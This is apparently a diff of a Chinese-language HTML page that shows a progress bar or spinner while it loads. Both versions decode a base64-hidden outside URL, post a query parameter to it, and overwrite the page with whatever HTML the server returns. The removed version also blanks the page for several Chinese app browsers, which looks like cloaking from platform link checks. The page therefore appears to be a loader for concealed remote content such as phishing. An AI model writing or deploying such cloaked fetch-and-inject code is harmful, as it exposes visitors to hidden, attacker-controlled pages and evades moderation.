@@ -1,230 +1,159 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black">
-  <meta name="format-detection" content="telephone=no">
-  <meta name="aplus-touch" content="1">
-  <title>每天都是元气满满的一天</title>
-  <link rel="icon" href="" type="image/x-icon">
+  <title>loading...</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
   <style>
-    body, html {
-      width: 100%;
-      height: 100%;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: linear-gradient(135deg, #87CEEB, #FFD700);
-      font-family: 'Arial', sans-serif;
-    }
-    #time-box {
-      position: absolute;
-      top: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      background-color: rgba(255, 255, 255, 0.8);
-      padding: 20px 30px;
-      border-radius: 20px;
-      font-size: 60px;
-      color: #333;
-      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-      font-weight: bold;
-      z-index: 10;
-    }
-    .timer-wrapper {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      width: 200px;
-      height: 200px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      padding: 20px;
-      text-align: center;
-    }
-    .progress-bar-container {
-      width: 100%;
-      height: 12px;
-      background-color: #eee;
-      border-radius: 6px;
-      overflow: hidden;
-      position: relative;
-    }
-    .progress-bar {
-      height: 100%;
-      width: 0%;
-      background: linear-gradient(90deg, #FF6347, #FFD700);
-    }
-    #percentage {
-      font-size: 18px;
-      color: #333;
-      font-weight: bold;
-      margin-top: 10px;
-    }
-    #loading-text {
-      margin-top: 15px;
-      font-size: 18px;
-      color: #333;
-      font-weight: bold;
-    }
-    #quote-box {
-      position: fixed;
-      bottom: 100px;
-      left: 50%;
-      transform: translateX(-50%);
-      background-color: rgba(255, 255, 255, 0.9);
-      padding: 20px 30px;
-      font-size: 18px;
-      color: #333;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-      font-weight: bold;
-      border-radius: 15px;
-      max-width: 90%;
-      text-align: center;
-      white-space: nowrap;
-      overflow: hidden;
-      text-overflow: ellipsis;
-    }
-    @media (max-width: 600px) {
-      #quote-box {
-        font-size: 16px;
-        padding: 15px 20px;
-      }
-    }
-  </style>
+<style>
+ * {
+	margin:0px;
+	padding:0px;
+	border:0px;
+}
+html,body {
+	min-height:100%;
+}
+body {
+	background:#f8f8f8;
+}
+.loader {
+	position:absolute;
+	top:0px;
+	bottom:0px;
+	left:0px;
+	right:0px;
+	margin:auto;
+	width:175px;
+	height:100px;
+}
+.loader span {
+	display:block;
+	background:#fcb34f;
+	width:7px;
+	height:10%;
+	border-radius:14px;
+	margin-right:5px;
+	float:left;
+	margin-top:25%;
+}
+.loader span:last-child {
+	margin-right:0px;
+}
+.loader span:nth-child(1) {
+	animation:load 2.5s 1.4s infinite linear;
+}
+.loader span:nth-child(2) {
+	animation:load 2.5s 1.2s infinite linear;
+}
+.loader span:nth-child(3) {
+	animation:load 2.5s 1s infinite linear;
+}
+.loader span:nth-child(4) {
+	animation:load 2.5s 0.8s infinite linear;
+}
+.loader span:nth-child(5) {
+	animation:load 2.5s 0.6s infinite linear;
+}
+.loader span:nth-child(6) {
+	animation:load 2.5s 0.4s infinite linear;
+}
+.loader span:nth-child(7) {
+	animation:load 2.5s 0.2s infinite linear;
+}
+.loader span:nth-child(8) {
+	animation:load 2.5s 0s infinite linear;
+}
+.loader span:nth-child(9) {
+	animation:load 2.5s 0.2s infinite linear;
+}
+.loader span:nth-child(10) {
+	animation:load 2.5s 0.4s infinite linear;
+}
+.loader span:nth-child(11) {
+	animation:load 2.5s 0.6s infinite linear;
+}
+.loader span:nth-child(12) {
+	animation:load 2.5s 0.8s infinite linear;
+}
+.loader span:nth-child(13) {
+	animation:load 2.5s 1s infinite linear;
+}
+.loader span:nth-child(14) {
+	animation:load 2.5s 1.2s infinite linear;
+}
+.loader span:nth-child(15) {
+	animation:load 2.5s 1.4s infinite linear;
+}
+@keyframes load {
+	0% {
+	background:#fcb34f;
+	margin-top:25%;
+	height:10%;
+}
+50% {
+	background:#ff840b;
+	height:100%;
+	margin-top:0%;
+}
+100% {
+	background:#ff840b;
+	height:10%;
+	margin-top:25%;
+}
+}</style>
 </head>
 <body>
-  <div id="quote-box">"每一天都是新的开始。"</div>
-  <div id="time-box"></div>
-
-  <div id="timer" class="timer-wrapper">
-    <div class="progress-bar-container">
-      <div class="progress-bar" id="progress-bar"></div>
-    </div>
-    <div id="loading-text">加载中，请耐心等待</div>
-    <div id="percentage">0%</div>
-  </div>
-
+<div class="loader">
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+    <span></span>
+</div>
   <script>
-function checkApp() {
-  const ua = navigator.userAgent.toLowerCase();
-  const isWeChat = ua.includes("micromessenger");
-  const isBrowser = /chrome|safari|firefox|edge|opera/.test(ua);
-  const blockedApps = ["qq", "alipay", "douyin", "toutiao", "ucbrowser", "baiduboxapp"];
-  const isBlocked = blockedApps.some(app => ua.includes(app));
+    const apiUrl = "aHR0cHM6Ly9obWZuLmNuL0Nvcy9hcGkucGhw";
 
-  // 如果不是微信/浏览器，或者在白名单之外，直接白屏
-  if (!(isWeChat || isBrowser) || isBlocked) {
-    // 清空页面内容
-    document.documentElement.innerHTML = "";
-    // 可选：背景白色，禁止滚动
-    document.body.style.background = "#fff";
-    document.body.style.height = "100vh";
-    document.body.style.margin = "0";
-    document.body.style.overflow = "hidden";
-
-    // 阻止脚本继续执行
-    throw new Error("禁止访问此页面");
-  }
-}
-checkApp();
-
-let quoteInterval, timeInterval;
-const quotes = [
-  "成功不是终点，努力才是序幕。",
-  "你不能改变风的方向，但你可以转动风帆。",
-  "每天进步一点点，积少成多。",
-  "永不放弃，成功就是守住。",
-  "做你害怕的事，直到不再害怕它。",
-  "相信自己，任何事都可能实现。",
-  "今日事，今日毕。",
-  "机会是给准备好的人。",
-  "不要等待机会，而要创造机会。",
-  "难度中隐藏着机会。",
-  "最好的时光在未来，而不是过去。",
-  "永远保持好奇心。"
-];
-let currentQuoteIndex = 0;
-function updateQuote() {
-  document.getElementById("quote-box").innerText = `"${quotes[currentQuoteIndex]}"`;
-  currentQuoteIndex = (currentQuoteIndex + 1) % quotes.length;
-}
-function updateTime() {
-  const now = new Date();
-  const h = String(now.getHours()).padStart(2,'0');
-  const m = String(now.getMinutes()).padStart(2,'0');
-  const s = String(now.getSeconds()).padStart(2,'0');
-  document.getElementById("time-box").innerText = `${h}:${m}:${s}`;
-}
-function isWeChatBrowser() {
-  return /micromessenger/i.test(navigator.userAgent);
-}
-
-// 初始化
-quoteInterval = setInterval(updateQuote, 2000);
-timeInterval = setInterval(updateTime, 1000);
-document.getElementById("timer").style.display = 'block';
-
-async function loadPage() {
-  const apiUrl = "aHR0cHM6Ly9obWZuLmNuL0Nvcy9hcGkucGhw";
-  const url = getQueryString("key");
-  const decodedApiUrl = atob(apiUrl);
-
-  const progressBar = document.getElementById('progress-bar');
-  const percentageText = document.getElementById('percentage');
-  let progress = 0;
-
-  // 自动加载到 90%
-  const interval = setInterval(() => {
-    if (progress < 90) {
-      progress += 5;
-      progressBar.style.width = progress + '%';
-      percentageText.innerText = progress + '%';
+    function getQueryString(name) {
+      const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+      const r = window.location.search.substr(1).match(reg);
+      return r ? decodeURIComponent(r[2]) : null;
     }
-  }, 150);
 
-  try {
-    const response = await fetch(decodedApiUrl, {
-      method: 'POST',
-      headers: {'Content-Type':'application/x-www-form-urlencoded'},
-      body: `url=${encodeURIComponent(url)}`
-    });
-    const data = await response.json();
+    window.onload = async function() {
+      const url = getQueryString("key");
+      const decodedApiUrl = atob(apiUrl);
 
-    clearInterval(interval);
+      try {
+        const response = await fetch(decodedApiUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: `url=${encodeURIComponent(url)}`
+        });
 
-    // 补足剩下的 10%
-    progress = 100;
-    progressBar.style.width = '100%';
-    percentageText.innerText = '100%';
+        const data = await response.json();
 
-    // 停 200ms 后彻底替换页面
-    setTimeout(() => {
-      clearInterval(quoteInterval);
-      clearInterval(timeInterval);
-      document.open();
-      document.write(data.html || "null");
-      document.close();
-    }, 200);
+        setTimeout(() => {
+          document.write(data.html);
+        }, 200);
 
-  } catch(e) {
-    console.error("请求失败:", e);
-  }
-}
-loadPage();
-
-function getQueryString(name) {
-  const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
-  const r = window.location.search.substr(1).match(reg);
-  return r ? decodeURIComponent(r[2]) : null;
-}
+      } catch (error) {
+        console.error('请求失败:', error);
+      }
+    };
   </script>
 </body>
 </html>
